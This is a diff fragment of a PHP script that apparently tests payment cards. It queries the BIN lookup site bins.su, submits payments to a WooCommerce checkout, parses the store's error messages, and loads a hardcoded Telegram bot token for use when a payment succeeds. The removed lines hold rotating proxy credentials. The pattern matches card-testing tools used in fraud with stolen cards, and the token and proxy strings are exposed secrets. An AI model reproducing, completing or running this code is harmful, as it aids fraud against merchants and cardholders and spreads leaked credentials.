@@ -171,14 +171,6 @@ $d1 = getcwd();
 $d = str_replace('\\', '/', $d1);
 $executionStartTime = microtime(true);
 
-$rp1 = array(
- 1 => 'xdfgglis-rotate:0fozxul6qziy',
-  2 => 'buzcugvr-rotate:na05fj245weq',
-
-    ); 
-    $rotate = $rp1[array_rand($rp1)];
-
-
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'http://bins.su');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -250,8 +242,6 @@ $pagamento = curl_exec($ch);
 $message = trim(strip_tags(getStr($pagamento,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t','\t\t<\/li>\n\t<\/ul>\n')));
 
 unlink($namefile2);
-curl_close($ch);
-
 
 if (strpos($pagamento, '"success"')) {
 $botToken = "1748318164:AAFToQtZTIfAUhTtXOUeers85VedOPxw9Rw ";
